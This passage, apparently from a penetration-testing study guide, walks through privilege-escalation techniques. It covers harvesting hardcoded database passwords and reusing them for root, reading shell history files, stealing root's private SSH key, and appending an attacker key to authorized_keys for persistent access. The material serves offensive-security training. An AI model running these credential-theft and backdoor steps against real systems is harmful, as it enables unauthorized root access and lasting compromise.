### Real Example: Found Database Credentials

**Scenario:**
```
Running LinPEAS on target
Finds configuration file with hardcoded password
```

**Example Output:**
```
[+] Searching passwords in config PHP files
/var/www/html/config.php: $conn = new MySQL('localhost', 'db_user', 'password123');
```

**Exploitation:**

```bash
# Step 1: Note the credentials
# Username: db_user
# Password: password123

# Step 2: Try password reuse (user might use same password)
$ su - root
Password: password123
$ whoami
root
# SUCCESS!
```

---

### Password Reuse Exploitation

**Concept:**
```
Users often reuse passwords across systems
Database password = User password = Root password
```

**Process:**

```bash
# Step 1: Find password in config file
$ grep password /var/www/html/config.php
password123

# Step 2: Try to switch to root user
$ su - root
Password: password123

# Step 3: Check if you're root
$ whoami
root

# Step 4: Success!
$ id
uid=0(root) gid=0(root)
```

---

### Checking History Files

**Linux Bash History:**
```bash
cat ~/.bash_history
cat /root/.bash_history  # If readable

# Look for:
# - mysql -u root -p password
# - ssh root@...
# - Commands with credentials
```

**PowerShell History (Windows):**
```powershell
type $PROFILE\ConsoleHost_history.txt
# Or
Get-History

# Look for passwords, API keys, credentials
```

---

## Vector 5: SSH Key Exploitation

### Reading Private SSH Keys

**What are SSH Keys?**
```
Private keys: Like passwords for SSH (stored in ~/.ssh/id_rsa)
Public keys: Safe to share (stored in ~/.ssh/id_rsa.pub)
If you read someone's private key → You can log in as them
```

---

### Stealing Existing SSH Keys

**Finding SSH Keys:**

```bash
# User SSH keys
cat /home/user/.ssh/id_rsa

# Root SSH keys
cat /root/.ssh/id_rsa

# Check if readable
ls -la /root/.ssh/
```

---

### Using Stolen SSH Keys

**On Your Attacker Machine:**

```bash
# Step 1: Copy the private key
# (You got it from reading /root/.ssh/id_rsa)
vim id_rsa
# Paste the key contents

# Step 2: Fix permissions (SSH requires 600)
chmod 600 id_rsa

# Step 3: SSH using the key
ssh -i id_rsa root@TARGET_IP

# Step 4: You're logged in as root!
root@target:~# id
uid=0(root) gid=0(root)
```

---

### Creating SSH Key Persistence

**Goal:**
```
Gain SSH access that persists after you disconnect
Create permanent backdoor
Use your own key so no password needed
```

---

### Method 1: If You Have File Write Access

**Scenario:**
```
You have shell as www-data
You have write access to /root/.ssh/
You want persistent SSH access
```

**Process:**

```bash
# Step 1: On ATTACKER MACHINE - Generate your key pair
ssh-keygen -f key
# Creates: key (private) and key.pub (public)

# Step 2: Copy the PUBLIC key to clipboard
cat key.pub
# AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...

# Step 3: On TARGET MACHINE - Add your public key to authorized_keys
echo "AAAAB3NzaC1yc2EAAAADAQABAAABgQDk..." >> /root/.ssh/authorized_keys

# Step 4: Back on ATTACKER MACHINE - SSH with your private key
ssh -i key root@TARGET_IP

# Step 5: You're logged in as root!
root@target:~#
```

---

### Step-by-Step SSH Key Installation

**On Attacker Machine (Generate Key):**

```bash
# Step 1: Generate key pair
$ ssh-keygen -f key
Generating public/private rsa key pair.
Enter passphrase (empty for no passphrase): [press Enter]
Your identification has been saved in key
Your public key has been saved in key.pub

# Step 2: Check the files
$ ls -la key*
-rw------- 1 user user 1679 Jan 25 10:30 key
-rw-r--r-- 1 user user  401 Jan 25 10:30 key.pub

# Step 3: Display public key (for copying)
$ cat key.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...SNIP...M=user@attacker
```

---

**On Target Machine (Install Public Key):**

```bash
# Step 1: As the compromised user (www-data with write to /root/.ssh/)
$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...SNIP...M=user@attacker" >> /root/.ssh/authorized_keys

# Step 2: Verify it was added
$ cat /root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDk...SNIP...M=user@attacker

# Step 3: Fix permissions (if needed)
chmod 600 /root/.ssh/authorized_keys
chmod 700 /root/.ssh/
```

---

**Back on Attacker Machine (Login):**

```bash
# Step 1: SSH using your private key
$ ssh -i key root@TARGET_IP

# Step 2: No password needed! (SSH key authentication)
root@target:~# 

# Step 3: You're logged in as root!
root@target:~# id
uid=0(root) gid=0(root) groups=0(root)

# Step 4: Persistent access - you can reconnect anytime
# Even if other shells die, SSH key still works
```

---

## SSH Key Security Note

**Why chmod 600?**

```
SSH keys must have restrictive permissions
If readable by other users → SSH refuses to use key

Correct permissions:
- Private key: 600 (-rw-------)
- .ssh directory: 700 (drwx------)
- authorized_keys: 600 (-rw-------)
```

---

## Key Takeaways - Part 3: User Privileges & Credentials

1. **Sudo Privileges:**
   - Check with `sudo -l`
   - Look for NOPASSWD entries
   - Use GTFOBins to find exploits
   - Often easiest PrivEsc vector

2. **SUID/SGID Binaries:**
   - Find with `find / -perm -4000`
   - Exploit custom/vulnerable binaries
   - Standard binaries usually patched
   - Look for command injection flaws

3. **Scheduled Tasks (Linux/Windows):**
   - Linux: Cron jobs in /etc/cron.d/, /etc/crontab
   - Windows: Scheduled tasks via Task Scheduler
   - Two exploitation methods: Create new or modify existing
   - Wait for scheduled time to execute

4. **Exposed Credentials:**
   - Check config files for hardcoded passwords
   - Check history files for reused passwords
   - Try password reuse across accounts
   - Often leads to direct root access

5. **SSH Keys:**
   - Reading private keys = SSH access
   - Create key pair on attacker machine
   - Install public key in authorized_keys
   - Persistent access without passwords
   - Must use chmod 600 for permissions

6. **Strategic Priority:**
   - Sudo → Fastest if NOPASSWD
   - Credentials → Easiest if found
   - SSH Keys → Most persistent
   - Cron → Reliable but requires waiting
   - SUID → Depends on availability

---

## Notes